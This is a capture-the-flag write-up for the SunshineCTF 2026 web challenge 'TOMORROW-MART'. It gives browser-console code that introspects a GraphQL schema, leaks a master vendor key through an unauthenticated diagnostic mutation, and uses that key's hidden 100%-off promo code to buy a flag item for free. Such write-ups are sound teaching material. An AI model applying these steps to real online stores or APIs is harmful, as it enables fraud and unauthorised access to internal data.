---
title: "TOMORROW-MART — SunshineCTF 2026"
description: "The storefront offers a Founder’s Vault deed as lot 4042 for 1,000,000 credits. New FutureBank accounts only receive 500 credits, so the intended path is to find a discount code that is…"
event: "sun"
category: "web"
categoryLabel: "Web"
tags: ["SunshineCTF 2026","web"]
date: "2026-09-28"
teammate: false
source: "sun/web/tommarow/writeup.md"
---

## Challenge overview

The storefront offers a Founder’s Vault deed as lot `4042` for `1,000,000` credits. New FutureBank accounts only receive 500 credits, so the intended path is to find a discount code that is not shown in the UI.

## 1. Inspect the application

Open the challenge site in a browser and press `F12` to open Developer Tools. The checkout page’s JavaScript shows that the site uses a GraphQL endpoint at:

```text
/graphql
```

The visible operations include account registration, login, listings, promo codes, and orders. The JavaScript also reveals that orders accept a promo code:

```graphql
placeOrder(listingId: $id, promoCode: $promo)
```

## 2. Find the hidden GraphQL operation

In the browser console, query the GraphQL schema:

```js
(await (await fetch("/graphql", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({
    query: `{__schema {
      mutationType { fields { name } }
      queryType { fields { name } }
    }}`
  })
})).json()).data
```

Among the mutations is an unusual operation named `vendorTerminalSync`.

## 3. Leak the vendor key

Call the unauthenticated diagnostic mutation:

```js
(await (await fetch("/graphql", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({
    query: `mutation {
      vendorTerminalSync {
        terminalId
        status
        firmware
        vendorKey
        note
      }
    }`
  })
})).json()).data
```

The response discloses a vendor key similar to:

```text
VND-MASTER-21d5f80206dffb6fa9ad5722
```

The exact key may differ between challenge instances.

## 4. Retrieve the internal promo codes

Use the leaked key with the `promoCodes` query:

```js
(await (await fetch("/graphql", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({
    query: `{ promoCodes(vendorKey: "VND-MASTER-21d5f80206dffb6fa9ad5722") {
      code
      description
      percentOff
      appliesTo
    }}`
  })
})).json()).data
```

One returned code is:

```text
FOUNDERS-100
```

It applies to listing `4042` and gives 100% off.

## 5. Create an account

Register from the console and save the returned token:

```js
let r = await (await fetch("/graphql", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({
    query: `mutation($u:String!,$p:String!) {
      register(username:$u,password:$p) {
        success
        token
        account { handle }
      }
    }`,
    variables: {
      u: "scout" + Date.now(),
      p: "password"
    }
  })
})).json();

localStorage.tm_token = r.data.register.token;
```

## 6. Purchase the deed

Submit an order for lot `4042` with the internal promo code:

```js
(await (await fetch("/graphql", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "Authorization": "Bearer " + localStorage.tm_token
  },
  body: JSON.stringify({
    query: `mutation {
      placeOrder(listingId:"4042", promoCode:"FOUNDERS-100") {
        success
        message
        pricePaid
        flag
      }
    }`
  })
})).json()).data
```

The order succeeds with a price of 0 credits, and the `flag` field contains:

```text
sun{1_l0v3_fr33_stuff}
```

## Vulnerability summary

The challenge is vulnerable because an unauthenticated vendor diagnostic mutation exposes a master vendor key. That key grants access to internal promo codes, including a 100%-off code for the flag-bearing item. The frontend also exposes the GraphQL endpoint and its operation structure, making the complete exploit possible directly from browser DevTools.
